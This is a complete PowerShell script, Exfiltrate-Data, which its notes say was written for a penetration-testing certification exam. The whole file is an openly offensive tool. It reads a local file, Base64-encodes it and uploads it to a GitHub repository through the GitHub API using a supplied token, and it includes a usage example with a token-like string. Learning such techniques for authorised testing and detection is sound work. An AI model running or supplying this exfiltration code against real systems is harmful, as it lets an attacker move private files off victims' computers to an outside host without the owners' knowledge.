function Exfiltrate-Data
{ 
<#
.SYNOPSIS
A PowerShell script that Exfiltrate data to github reposotiry.

.DESCRIPTION
A PowerShell script for exfiltrating data or files from a local computer to a github repository using github API.

.PARAMETER token
github authentication token to use while connecting to a repo for uploading the file.

.PARAMETER filename
the file to upload.

.PARAMETER gitUri
github repo's URI for exmaple: https://api.github.com/repos/:owner/:repo/contents/:path  

.PARAMETER Message
Message for the commit.

.PARAMETER Name
author name of the commit. 

.PARAMETER email
email of the committer.

.PARAMETER branch
The repository branch by default it will be: Master. 

.EXAMPLE
PS C:\> . .\Exfiltrate
PS C:\> Exfiltrate-Data -token 4f214c8f364b6ad1xf84f9dd3a201910cbba67c5 -gitUri https://api.github.com/repos/thams-es/Exf-Test/contents/11.txt -filename .\l1.txt


.LINK
http://www.tomsitpro.com/articles/using-powershell-with-json-data,1-3445.html
https://developer.github.com/v3/#authentication


.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3222
#>
           
    [CmdletBinding()] Param( 

       [Parameter(Mandatory = $true)]
       [String]
       $token,
       
       [Parameter(Mandatory = $true)]
       [String]
       $gitUri,

       [Parameter(Mandatory = $true)]
       [String]
       $filename,

       [Parameter(Mandatory = $false)]
       [String]
       $Name = 'ComitterName',

       [Parameter(Mandatory = $false)]
       [String]
       $email = 'ComitterEmail@example.com',

       [Parameter(Mandatory = $false)]
       [String]
       $Message = 'FirstCommit',

       [Parameter(Mandatory = $false)]
       [String]
       $branch = 'master'
    )



	
    #Converting the file to Base64 
    $file = Get-Content $filename
    $fileBytes = [System.Text.Encoding]::UTF8.GetBytes($file)
    $fileEncoded = [System.Convert]::ToBase64String($fileBytes)

    #Preparing the request 
    $auth = @{"Authorization"="token $token"}
    $committer = @{"name"=$Name; "email"=$email}
    $data = @{"path"=$fileName; "message"=$Message; "committer"=$committer; "content"=$fileEncoded; "branch"=$branch}
    $Json = $data | ConvertTo-Json

	 
    # Making put request to upload the file in github 
    $request = New-Object -ComObject Msxml2.XMLHTTP
    $request.open("PUT","$gitUri", $false)
    $request.setRequestHeader("Authorization", "token $token")
    $request.send($Json)
        

    if ($request.status -eq "201")
    {
        Write-Host "File uploaded succesfully!" -ForegroundColor Green
    }
    else
    {
        Write-Host "Error make sure the token is valid" -ForegroundColor Red
    }
   

}